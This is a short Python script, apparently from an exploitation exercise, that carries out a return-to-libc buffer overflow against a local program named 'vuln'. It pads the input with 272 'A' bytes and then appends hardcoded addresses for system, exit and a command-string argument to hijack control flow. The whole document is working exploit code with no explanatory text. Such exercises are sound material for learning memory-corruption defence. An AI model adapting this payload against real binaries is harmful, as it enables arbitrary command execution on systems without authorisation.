#exp.py
#!/usr/bin/env python
import struct
from subprocess import call

system = 0x8048380
exit = 0x80483a0
system_arg = 0x80485b5     #Obtained from hexdump output of executable 'vuln'

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

# Junk + system + exit + system_arg
buf = "A" * 272
buf += conv(system)
buf += conv(exit)
buf += conv(system_arg)

print "Calling vulnerable program"
call(["./vuln", buf])
